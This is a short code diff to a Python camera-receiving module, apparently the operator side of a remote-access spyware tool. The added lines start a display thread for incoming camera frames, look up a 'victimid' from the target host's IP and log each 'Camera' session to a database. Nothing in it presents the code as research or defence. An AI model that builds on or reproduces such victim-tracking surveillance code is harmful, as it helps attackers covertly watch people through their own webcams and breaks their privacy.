@@ -8,6 +8,8 @@ import select
 import numpy as np
 import cv2
 
+from datetime import datetime
+from database.connect.connect import *
 
 def recvall(sock, size):
     buf = b''
@@ -45,7 +47,7 @@ class CameraReceiver:
         self.double_buffer = None
         self.lock = threading.Lock()
         self.update_thread = None
-        self.frame_ready = threading.Event()  # Add event for frame synchronization
+        self.frame_ready = threading.Event()  
         self.error_surface = None
         self.connection_error = False
 
@@ -182,4 +184,9 @@ class CameraReceiver:
 def camerareceiver(host, port=5002):
     receiver = CameraReceiver(host, port)
     receiver.start()
+    threading.Thread(target=receiver.update_screen, daemon=True).start()
+    execution_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    victimid = get_victimid_by_ip(host)
+    conn = connect_to_database()
+    insert_log(conn, victimid, "Camera", execution_time)
     return receiver
